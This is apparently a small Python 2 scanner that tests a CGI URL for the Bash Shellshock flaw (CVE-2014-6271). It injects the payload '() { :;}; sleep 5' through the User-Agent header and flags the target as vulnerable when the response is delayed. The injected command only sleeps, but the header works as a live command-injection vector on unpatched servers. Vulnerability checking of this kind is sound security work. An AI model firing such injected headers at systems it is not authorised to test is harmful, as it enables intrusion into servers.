#!/usr/bin/env python
import sys
import requests
from time import time

class color:
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

# Variable for sleep time that will be injected, change as needed.
sleep_time = 5
sleep_time = str(sleep_time)
is_vulnerable = False


url = ""
try:
	url = sys.argv[1]
except:
	print "\n{0}Missing required url argument{1}".format(color.yellow,color.end)
	print "Ex: ./shocknaww.py http://site.com/cgi-bin/test"

	sys.exit()

shock = requests.Session()


payloads = [{"cve":"CVE-2014-6271", "payload":"() { :;}; sleep "+sleep_time}]


for bug in payloads:
	payload = bug["payload"]
	headers = {"User-Agent": payload}

	start = time()
	response = shock.get(url, headers=headers)

	delay = time() - start

	print delay

	if delay > int(sleep_time):
		is_vulnerable = True
		print "{0}{1} appears to be vulnerable to {2}{3}".format(color.red, url, bug["cve"], color.end)
	else:
		pass
if is_vulnerable == False:
	print "{0}{1} is not vulnerable to any of the recent BASH vulnerabilities.{2}".format(color.green, url, color.end)
